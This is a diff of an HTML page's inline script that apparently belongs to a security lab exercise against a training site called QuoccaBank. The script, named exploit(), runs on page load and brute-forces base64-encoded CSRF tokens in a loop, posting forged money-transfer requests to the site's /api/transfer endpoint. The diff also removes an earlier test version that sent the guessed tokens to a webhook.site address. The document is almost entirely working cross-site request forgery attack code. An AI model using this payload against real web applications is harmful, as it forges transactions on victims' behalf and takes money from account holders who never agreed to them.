@@ -9,39 +9,24 @@
         async function exploit() {
             const target = "https://engineering.quoccabank.com/api/transfer";
 
-            // for (let i = 8619; i < 9999; i++) {
-            //     let token = btoa(i.toString());
-
-            //     let body = new URLSearchParams();
-            //     body.append('csrf_token', token);
-            //     body.append('username', 'z5631971');
-            //     body.append('amount', '1');
-
-            //     fetch(target, {
-            //         method: 'POST',
-            //         body: body,
-            //         mode: 'no-cors',
-            //         headers: {
-            //             'Content-Type': 'application/x-www-form-urlencoded'
-            //         }
-            //     });
-            // }
-
-            for (let i=8619; i<8621; i++){
+            for (let i = 8619; i < 9999; i++) {
                 let token = btoa(i.toString());
 
                 let body = new URLSearchParams();
                 body.append('csrf_token', token);
+                body.append('username', 'z5631971');
+                body.append('amount', '1');
 
-                fetch("https://webhook.site/4548d123-8f9b-4f6d-922b-83fa7e59bb2b", {
+                fetch(target, {
                     method: 'POST',
                     body: body,
                     mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded'
                     }
-                })
+                });
             }
+
         }
         exploit();
     </script>
